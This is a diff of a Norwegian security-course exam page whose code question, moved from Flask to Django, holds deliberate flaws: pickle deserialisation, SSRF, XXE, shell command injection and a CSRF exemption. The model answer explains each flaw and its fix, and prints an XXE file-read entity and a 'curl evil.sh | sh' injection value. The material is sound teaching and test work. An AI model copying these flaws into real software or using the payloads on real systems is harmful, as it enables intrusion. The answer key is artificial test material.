@@ -67,35 +67,32 @@
       <header class="exam-q__head">
         <span class="exam-q__num">Spørsmål 3</span>
         <span class="exam-q__points">7 poeng</span>
-        <span class="exam-q__topic">Kap. 2 — Kode-quiz (Python / Flask)</span>
+        <span class="exam-q__topic">Kap. 2 — Kode-quiz (Django)</span>
       </header>
       <div class="exam-q__body">
-        <p class="q-text">Følgende Flask-endepunkt mottar en eksport-konfigurasjon, henter en mal fra en URL, og rapporterer resultatet til en webhook. Identifiser <strong>tre sårbarheter</strong> med linjenummer, forklar utnyttelse, og foreslå en konkret fiks for hver. (2 p per sårbarhet) En fjerde rimelig sårbarhet gir bonus opptil 1 p.</p>
-<pre><code> 1  from flask import Flask, request, jsonify
- 2  import pickle, base64, requests, subprocess
- 3  from lxml import etree
- 4
- 5  app = Flask(__name__)
+        <p class="q-text">Følgende Django <code>views.py</code> håndterer en eksport-funksjon: den mottar en pickled konfigurasjon, henter en mal fra en URL, parser den som XML, og rapporterer resultatet til en webhook. Identifiser <strong>tre sårbarheter</strong> med linjenummer, forklar utnyttelse, og foreslå en konkret fiks for hver. (2 p per sårbarhet) En fjerde rimelig sårbarhet gir bonus opptil 1 p.</p>
+<pre><code> 1  import pickle, base64, requests, subprocess
+ 2  from lxml import etree
+ 3  from django.http import JsonResponse
+ 4  from django.views.decorators.csrf import csrf_exempt
+ 5  from django.views.decorators.http import require_POST
  6
- 7  @app.route("/api/export", methods=["POST"])
- 8  def export():
- 9      data = request.get_json()
-10      cfg = pickle.loads(base64.b64decode(data["cfg"]))
+ 7  @csrf_exempt
+ 8  @require_POST
+ 9  def export(request):
+10      cfg = pickle.loads(base64.b64decode(request.POST["cfg"]))
 11
-12      template_url = data["template_url"]
+12      template_url = request.POST["template_url"]
 13      r = requests.get(template_url, timeout=5)
 14      tree = etree.fromstring(r.content)
 15
-16      report_name = data["name"]
+16      report_name = request.POST["name"]
 17      cmd = "wkhtmltopdf - /var/reports/{}.pdf".format(report_name)
 18      subprocess.run(cmd, shell=True, input=etree.tostring(tree))
 19
 20      webhook = cfg.get("webhook")
 21      requests.post(webhook, json={"status": "ok", "report": report_name})
-22      return jsonify({"ok": True})
-23
-24  if __name__ == "__main__":
-25      app.run(host="0.0.0.0", port=8000, debug=True)
+22      return JsonResponse({"ok": True})
 </code></pre>
         <details class="fasit-details">
           <summary>Vis modellsvar</summary>
@@ -105,7 +102,7 @@
             <p><strong>Sårbarhet 3 — XXE (linje 14).</strong> <code>lxml.etree.fromstring</code> default-parser tillater eksterne entiteter og DTD-er. En mal som inneholder <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> får serveren til å lese filer eller initiere out-of-band-requester. <em>Fiks:</em> bruk eksplisitt <code>parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)</code> og <code>etree.fromstring(r.content, parser)</code>. Defusedxml er en drop-in trygg variant.</p>
             <p><strong>Sårbarhet 4 (bonus) — Command injection (linje 16–18).</strong> <code>report_name</code> interpoleres inn i shell-streng. <code>name = "x; curl evil.sh | sh #"</code> kjører vilkårlige kommandoer. <em>Fiks:</em> <code>subprocess.run(["wkhtmltopdf", "-", out_path], shell=False, input=...)</code>; valider/whitelist navn (regex <code>^[a-zA-Z0-9_-]+$</code>).</p>
             <p><strong>Bonus 2 — SSRF til webhook (linje 20–21).</strong> <code>webhook</code> kommer fra angriper-kontrollert pickle og brukes som ny HTTP-request: en andre SSRF-vei. Samme fiks som over (whitelist).</p>
-            <p><strong>Bonus 3 — <code>debug=True</code> på linje 25</strong> aktiverer Werkzeug debug-konsoll med RCE-pin; må aldri stå i produksjon.</p>
+            <p><strong>Bonus 3 — <code>@csrf_exempt</code> (linje 7)</strong> deaktiverer Djangos innebygde CSRF-vern på en state-endrende POST-funksjon. En autentisert bruker kan lures til å sende en cross-origin-request som trigger eksporten med angripers parametre. <em>Fiks:</em> fjern dekoratoren og bruk CSRF-token i klienten; for API-endepunkter bruk DRF-baserte autentiseringsmekanismer (Bearer-token / session med SameSite).</p>
             <p class="ref">Pensum: <a href="../../kap2/injection.html">Kap. 2 — Injection</a> · <a href="../../kap2/konfig-krypto-ssrf.html">SSRF / Deserialisering</a></p>
           </div>
         </details>
